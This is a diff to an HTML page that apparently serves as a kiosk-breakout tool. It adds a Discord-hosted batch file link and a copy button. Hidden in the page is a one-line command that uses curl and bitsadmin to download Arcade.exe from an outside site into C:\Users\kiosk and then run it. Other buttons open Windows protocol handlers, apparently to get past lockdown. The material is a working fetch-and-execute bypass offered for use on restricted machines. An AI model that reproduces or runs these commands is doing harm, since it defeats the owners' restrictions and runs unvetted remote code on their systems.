@@ -59,6 +59,10 @@
             color: #1a6ae4;
         }
 
+        ul li a[href="https://cdn.discordapp.com/attachments/1061007266066739221/1183257181001359480/universal.bat"] {
+            color: #1a6ae4;
+        }
+
         main {
             display: flex;
             flex-direction: row;
@@ -160,6 +164,8 @@
                 <li><a href="https://cdn.discordapp.com/attachments/1120094264622325780/1155068189596717086/cmd.url">Drag CMD</a>
                     <br>
                     <a href="https://cdn.discordapp.com/attachments/1061007266066739221/1183257181001359480/universal.bat">Drag universal bat</a>
+                    <br>
+                    <a href="https://cdn.discordapp.com/attachments/1061007266066739221/1185724202595131402/gfk.bat">Drag universal bat (GFK)</a>
                 </li>
             </ul>
         </section>
@@ -168,12 +174,24 @@
             <button onclick="window.open('ms-clipchamp:', '_blank')">Open ms-ClipChamp</button>
             <button onclick="window.open('ms-officeapp:', '_blank')">Open ms-Officeapp</button>
             <button id="copyButton">Copy one line bat</button>
+            <button id="copyGFKButton">Copy one line bat (GFK)</button>
         </section>
         <div id="textToCopy" style="display: none;">bitsadmin /transfer "Download Arcade" /download /priority normal https://picteon.dev/files/Arcade.exe "C:\Users\kiosk\Downloads\Arcade.exe"</div>
-        
+        <div id="textToCopyGFK" style="display: none;">cd \ && cd users && cd kiosk && cd downloads && curl -O "https://picteon.dev/files/Arcade.exe" && bitsadmin /create 1 && bitsadmin /addfile 1 C:\Users\kiosk\downloads\Arcade.exe C:\Users\kiosk\Arcade.exe && bitsadmin /RESUME 1 && bitsadmin /Complete 1 && bitsadmin /reset && cd \ && cd users && cd kiosk && start Arcade.exe && cls</div>
 <script>
     document.getElementById('copyButton').addEventListener('click', function() {
         var textToCopy = document.getElementById('textToCopy').textContent;
+        var tempInput = document.createElement('input');
+        tempInput.style = "position: absolute; left: -1000px; top: -1000px";
+        tempInput.value = textToCopy;
+        document.body.appendChild(tempInput);
+        tempInput.select();
+        document.execCommand('copy');
+        document.body.removeChild(tempInput);
+        alert('Copied!');
+    });
+    document.getElementById('copyGFKButton').addEventListener('click', function() {
+        var textToCopy = document.getElementById('textToCopyGFK').textContent;
         var tempInput = document.createElement('input');
         tempInput.style = "position: absolute; left: -1000px; top: -1000px";
         tempInput.value = textToCopy;
